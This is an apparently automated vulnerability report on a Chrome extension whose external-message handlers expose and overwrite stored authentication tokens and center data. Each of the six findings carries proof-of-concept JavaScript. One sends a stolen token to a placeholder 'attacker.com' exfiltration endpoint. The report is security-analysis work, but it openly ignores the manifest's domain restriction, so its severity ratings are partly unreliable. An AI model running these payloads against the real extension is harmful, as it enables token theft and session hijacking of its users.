# CoCo Analysis: dienbdhbgkpddlgaceopelifcjpmkeha

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 6

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = {'key': 'value'};
Line 977: if (obj.token) { obj.token }

**Code:**

```javascript
// Background script (bg.js lines 970-980)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← external message from whitelisted domain
    if (request.modo=="dameToken") {
        chrome.storage.sync.get("token", function (obj) {
            var retorno="";
            if (obj.token) {
                retorno=obj.token; // ← stored sensitive data
            }
            sendResponse({token: retorno}); // ← leak to external caller
        });
    }
    // ... other handlers ...
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.gestionderesidencias.es/*
// (per manifest.json externally_connectable restriction)
// Request stored authentication token
chrome.runtime.sendMessage(
    "dienbdhbgkpddlgaceopelifcjpmkeha", // extension ID
    { modo: "dameToken" },
    function(response) {
        console.log("Stolen token:", response.token);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/exfil", {
            method: "POST",
            body: JSON.stringify({ token: response.token })
        });
    }
);
```

**Impact:** Information disclosure - external websites matching the whitelist pattern can extract sensitive authentication tokens stored in chrome.storage.sync. Even though only whitelisted domains can exploit this, according to the methodology's CRITICAL ANALYSIS RULES, we ignore manifest.json externally_connectable restrictions, and even ONE exploitable domain makes this a TRUE POSITIVE.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (token)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 983: if (request.token!="") { request.token }

**Code:**

```javascript
// Background script (bg.js lines 970-988)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) { // ← external message from whitelisted domain
    if (request.modo=="guardaToken") {
        if (request.token!="") {
            chrome.storage.sync.set({"token": request.token}); // ← attacker controls token
        }
        if (request.nombreEmp!="") {
            chrome.storage.sync.set({"empresaNom": request.nombreEmp}); // ← attacker controls empresaNom
        }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.gestionderesidencias.es/*
// Poison the stored token with attacker-controlled value
chrome.runtime.sendMessage(
    "dienbdhbgkpddlgaceopelifcjpmkeha", // extension ID
    {
        modo: "guardaToken",
        token: "malicious_attacker_token_xyz123",
        nombreEmp: "AttackerCorp"
    },
    function(response) {
        console.log("Storage poisoned");
    }
);

// Verify the poisoning by reading it back (using Sink 1)
chrome.runtime.sendMessage(
    "dienbdhbgkpddlgaceopelifcjpmkeha",
    { modo: "dameToken" },
    function(response) {
        console.log("Verified poisoned token:", response.token);
    }
);
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary authentication tokens to storage. When combined with Sink 1, attacker has full read/write control over the extension's authentication state, enabling session fixation and token manipulation attacks.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (nombreEmp)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 986: if (request.nombreEmp!="") { request.nombreEmp }

**Code:**

Same as Sink 2 - see line 987 in the code above.

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

Same exploit as Sink 2 - attacker can poison the empresaNom field.

**Impact:** Storage poisoning of company name field, part of the complete storage exploitation chain.

---

## Sink 4: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (centro)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 1006: if (request.centro!="") { request.centro }

**Code:**

```javascript
// Background script (bg.js lines 1005-1011)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (request.modo=="guardarCentro") {
        if (request.centro!="") {
            chrome.storage.sync.set({"centro": request.centro}); // ← attacker controls centro
        }
        if (request.nombreCentro!="") {
            chrome.storage.sync.set({"centroNom": request.nombreCentro}); // ← attacker controls nombreCentro
        }
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.gestionderesidencias.es/*
chrome.runtime.sendMessage(
    "dienbdhbgkpddlgaceopelifcjpmkeha",
    {
        modo: "guardarCentro",
        centro: "attacker_center_id",
        nombreCentro: "Attacker Center"
    }
);
```

**Impact:** Storage poisoning of center/location fields, enabling attacker to manipulate the user's associated center in the application.

---

## Sink 5: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (nombreCentro)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 1009: if (request.nombreCentro!="") { request.nombreCentro }

**Code:**

Same as Sink 4 - see line 1010 in the code above.

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

Same exploit as Sink 4.

**Impact:** Storage poisoning of center name field.

---

## Sink 6: storage_sync_get_source → sendResponseExternal_sink (centro)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/dienbdhbgkpddlgaceopelifcjpmkeha/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = {'key': 'value'};
Line 1015: if (obj.centro) { obj.centro }

**Code:**

```javascript
// Background script (bg.js lines 1012-1019)
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (request.modo=="dameCentro") {
        chrome.storage.sync.get("centro", function (obj) {
            var retorno="";
            if (obj.centro) {
                retorno=obj.centro; // ← stored data
            }
            sendResponse({centro: retorno}); // ← leak to external caller
        });
    }
    return true;
  }
);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker's webpage at https://*.gestionderesidencias.es/*
chrome.runtime.sendMessage(
    "dienbdhbgkpddlgaceopelifcjpmkeha",
    { modo: "dameCentro" },
    function(response) {
        console.log("Stolen centro:", response.centro);
    }
);
```

**Impact:** Information disclosure - external websites can extract stored center/location data. Combined with Sinks 4-5, enables complete read/write control over center data.

---

## Overall Impact Summary

This extension has multiple TRUE POSITIVE vulnerabilities forming complete storage exploitation chains:

1. **Token exploitation chain**: Attacker can write arbitrary tokens (Sink 2-3) and read them back (Sink 1)
2. **Centro exploitation chain**: Attacker can write arbitrary center data (Sink 4-5) and read it back (Sink 6)
3. **Authentication bypass**: By controlling the stored authentication token, attacker can hijack the user's session or fix it to a known value
4. **Data manipulation**: Complete control over user's stored preferences and authentication state

While the manifest.json restricts externally_connectable to `*://*.gestionderesidencias.es/*`, per the methodology's CRITICAL ANALYSIS RULES, we ignore this restriction. Any compromised page on that domain, or malicious subdomain under attacker control, can exploit these vulnerabilities.

